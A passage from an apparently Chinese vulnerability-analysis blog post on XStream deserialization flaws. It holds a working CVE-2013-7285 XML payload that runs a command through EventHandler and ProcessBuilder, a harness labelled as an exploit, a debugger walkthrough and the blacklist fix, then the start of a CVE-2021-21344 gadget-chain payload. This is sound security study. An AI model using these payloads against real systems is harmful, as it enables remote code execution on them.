+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>-na<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calculator<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用以下代码来模拟漏洞环境</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.io.xml.DomDriver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CVE_2013_7285 Exploit  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2013_7285</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;demo.xml&quot;</span>);</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>(<span class="keyword">new</span> <span class="title class_">DomDriver</span>());</span><br><span class="line">        xStream.fromXML(fileInputStream);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功触发</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752149236369-77039c82-a804-4b26-b0a3-dc789066688e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752149236369-77039c82-a804-4b26-b0a3-dc789066688e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h4 id="ZzNQH">漏洞分析</h4>
+现在我们对解析流程进行追踪，在`AbstractTreeMarshallingStrategy`的`unmarshal`方法中调用了`TreeUnmarshaller`的`start`方法，即开始解析XML内容
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752158400843-6ade1bd1-de68-42de-83ca-776e5d5b3fe9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752158400843-6ade1bd1-de68-42de-83ca-776e5d5b3fe9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>在<code>TreeUnmarshaller#start</code>中，可以看到调用了<code>HierarchicalStreams.readClassType()</code>方法，该方法的作用是获取到XML中根标签的标签类型</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752158370053-0eeb7406-9954-4bc2-86ee-42eb3c4b5f27.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752158370053-0eeb7406-9954-4bc2-86ee-42eb3c4b5f27.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>在<code>readClassType</code>方法中会进行递归遍历，直到找到根标签的标签类型</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752158658201-4bb23f5a-f206-4b01-8a70-a7beb8df34f2.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752158658201-4bb23f5a-f206-4b01-8a70-a7beb8df34f2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>接着会调用<code>convertAnother</code>函数，对<code>java.util.SortedSet</code>类型进行转换，跟进该函数，调用<code>mapper.defaultImplementationOf()</code>函数来寻找<code>java.util.SortedSet</code>类型的默认实现类型进行替换，这里转换成了<code>java.util.TreeSet</code>类型</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752159230595-d5ed173e-a81c-41e9-9d6a-9a826e306bc2.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752159230595-d5ed173e-a81c-41e9-9d6a-9a826e306bc2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752160216407-d500a541-80a0-4810-9900-93120959c722.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752160216407-d500a541-80a0-4810-9900-93120959c722.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>接着调用<code>converterLookup.lookupConverterForType()</code>来寻找TreeSet对应类型的转换器，通过迭代<code>this.converters</code>，直到找出能转换TreeSet类型的<code>Converter</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752197806326-2caa09da-afed-46ab-98eb-50955fc1a6fd.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752197806326-2caa09da-afed-46ab-98eb-50955fc1a6fd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>接着往下调试，在<code>AbstractReferenceUnmarshaller.convert()</code>函数中看到，会调用<code>getCurrentReferenceKey</code>来获取当前的Reference键即标签名，接着将当前标签名压入<code>parenStack</code>栈中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752160743077-42e4cea9-a47a-464b-8321-c4e27e52cc37.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752160743077-42e4cea9-a47a-464b-8321-c4e27e52cc37.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>然后走入其父类的<code>convert</code>函数中，继续走进<code>DynamicProxyConverter</code>的<code>unmarshal</code>中，这里会按标签的内容生成对应接口的动态代理，此时这里的DUMMY是一个空代理的实现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752162022489-e69b2d1f-e526-45bd-a1fc-0adf84fcbe02.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752162022489-e69b2d1f-e526-45bd-a1fc-0adf84fcbe02.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">回到<code>DynamicProxyConverter</code>的<code>unmarshal</code>方法，里面调用了</p>
+<p><code>treeMapConverter.unmarshalComparator</code> 方法，这个方法获取到了第二个 XML 节点元素，这个方法当时漏看了，这个方法还是比较重要的，它获取到了 xml 根元素的子元素。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201201979-d74e5ca3-c320-465a-aa51-6ac8b36f70db.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201201979-d74e5ca3-c320-465a-aa51-6ac8b36f70db.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201258388-4072cb3d-0a7e-4536-91c4-e5faefe6688b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201258388-4072cb3d-0a7e-4536-91c4-e5faefe6688b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>下面的 <code>reader.movedown</code>方法用来获取子元素，并把子元素添加到当前 context 的 pathTracker中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201366400-b0577d9f-3371-42b5-a235-b42c80074d30.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201366400-b0577d9f-3371-42b5-a235-b42c80074d30.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟进之后就变得一目了然了，其中判断 reader 是否还有子元素</p>
+<p>继续往下执行<code>handler = (InvocationHandler)context.convertAnother(proxy, handlerType);</code>，接下来转换器转换最终得到EventHandler</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752162103063-8d023ede-16b2-42ca-91f1-3220eb94858c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752162103063-8d023ede-16b2-42ca-91f1-3220eb94858c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>然后进行代理的替换</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752198778878-aa95bc0f-e3dd-4e62-9d29-278cf928fd27.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752198778878-aa95bc0f-e3dd-4e62-9d29-278cf928fd27.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>往下调试，在<code> TreeSetConverter.unmarshal()</code> 方法中调用了 <code>this.treeMapConverter.populateTreeMap()</code>，从这个方法开始，XStream 开始处理了 XML 里面其他的节点元素。跟进该函数，先判断是否是第一个元素，是的话就调用 <code>putCurrentEntryIntoMap()</code>函数，即将当前内容缓存到 Map 中：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199123385-80b4825e-e434-4ed2-bb36-f98a5c7534ac.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199123385-80b4825e-e434-4ed2-bb36-f98a5c7534ac.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟进去，发现调用 <code>readItem</code> 方法读取标签内的内容并缓存到当前 Map 中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199161067-e4feec71-d58c-4895-8782-258a4d292349.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199161067-e4feec71-d58c-4895-8782-258a4d292349.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>走到<code>readItem</code>方法中，发现他又调用了<code>readClassType</code>和<code>convertAnother</code>方法，比较像递归调用的意思。而这里的元素已经成了第二个元素<code>&lt;dynamic-proxy&gt;</code></p>
+<p>通过查看 mapper 可以知道，目前保存在 mapper 当中的还是两个元素，而 XStream 的处理，则会处理最新的一个（最里层的一个）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199260846-6b167081-e50f-4442-a290-792710a0b6c9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199260846-6b167081-e50f-4442-a290-792710a0b6c9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199784597-f6d740de-a560-42e5-91a5-19b2c2d3b188.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752199784597-f6d740de-a560-42e5-91a5-19b2c2d3b188.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>经过处理之后返回的 type 就为最新的一个子元素的类型，这里是 <code>com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</code>，找到对应的转换器为 DynamicProxyConverter</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201813036-011f32a5-d633-4354-a39a-0170f27d6901.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201813036-011f32a5-d633-4354-a39a-0170f27d6901.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>首先判断当前元素是否还有子元素，如果存在子元素，则进行后续的判断</p>
+<p>根据编写的xml，获取的子元素为<code>&lt;interface&gt;</code>，经过判断<code>if (elementName.equals(&quot;interface&quot;))</code>，获取当前<code>&lt;interface&gt;</code>的元素，再将其转换类型</p>
+<p>如果仍然存在子元素，再获取完<code>&lt;interface&gt;</code>后，会进行下一次的遍历，我们xml中下一个子元素为<code>&lt;handler&gt;</code>，则获取标签所的对应类，并跳出迭代</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201944129-614f7c09-ff33-4f8e-8518-1415e66a3228.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752201944129-614f7c09-ff33-4f8e-8518-1415e66a3228.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>继续向下调试，会调用<code>Proxy.newProxyInstance</code>方法，这是动态代理中实例化代理类的过程。接着调用了<code>context.convertAnother</code>方法。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752202507856-d16d4a50-f661-496b-8ffe-a1bb2291bf06.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752202507856-d16d4a50-f661-496b-8ffe-a1bb2291bf06.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>对应转换器为<code>AbstractReflectionConverter</code>，这里先会调用<code>instantiateNewInstance</code>方法实例化一个<code>EventHandler</code>类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752202595765-d0920502-e3ff-488b-bdcd-0b1f33b6446b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752202595765-d0920502-e3ff-488b-bdcd-0b1f33b6446b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>继续向下跟进<code>doUnmarshal</code>方法，这里有是内部递归，在这里也看到了<code>hasChildren</code>方法。从 xml 中也 可以看到 <code>&lt;handler&gt;</code> 节点之下还有很多子节点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752203074283-be05c5f1-6b29-4a32-aa03-45d8df07f5d4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752203074283-be05c5f1-6b29-4a32-aa03-45d8df07f5d4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>剩下的都是类似的流程了</p>
+<p>将所有节点过完以后，最终会走到<code>treeMapConverter.populateTreeMap</code>，跟进到<code>put.All()</code> 方法，里面的变量为 <code>sortedMap</code>，查看一下它的值可以发现这是一串链式存储的数据。</p>
+<p>在大多数的<code>put</code>方法中，都会调用其<code>compare</code>方法，因此后面会走到<code>EventHandler#invoke</code>方法中，进行反射调用导致命令执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752203953369-ac6581c8-e0ae-4f06-be28-808aea0dce05.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752203953369-ac6581c8-e0ae-4f06-be28-808aea0dce05.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>最终是调用到<code>EventHandler#invoke</code>方法，调用栈如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">invoke:<span class="number">428</span>, EventHandler (java.beans)</span><br><span class="line">compareTo:-<span class="number">1</span>, $Proxy0 (com.sun.proxy)</span><br><span class="line">compare:<span class="number">1294</span>, TreeMap (java.util)</span><br><span class="line">put:<span class="number">538</span>, TreeMap (java.util)</span><br><span class="line">putAll:<span class="number">281</span>, AbstractMap (java.util)</span><br><span class="line">putAll:<span class="number">327</span>, TreeMap (java.util)</span><br><span class="line">populateTreeMap:<span class="number">122</span>, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br></pre></td></tr></table></figure>
+
+<h4 id="gNwxd">漏洞修复</h4>
+根据官方的修复手段，这里其实增加了黑名单
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">xstream.registerConverter(<span class="keyword">new</span> <span class="title class_">Converter</span>() &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canConvert</span><span class="params">(Class type)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> type != <span class="literal">null</span> &amp;&amp; (type == java.beans.EventHandler || type == java.lang.ProcessBuilder || Proxy.isProxy(type));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Unsupported type due to security reasons.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">marshal</span><span class="params">(Object source, HierarchicalStreamWriter writer, MarshallingContext context)</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Unsupported type due to security reasons.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, XStream.PRIORITY_LOW);</span><br></pre></td></tr></table></figure>
+
+<h3 id="JUbkO">CVE-2021-21344</h3>
+超长Payload
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span 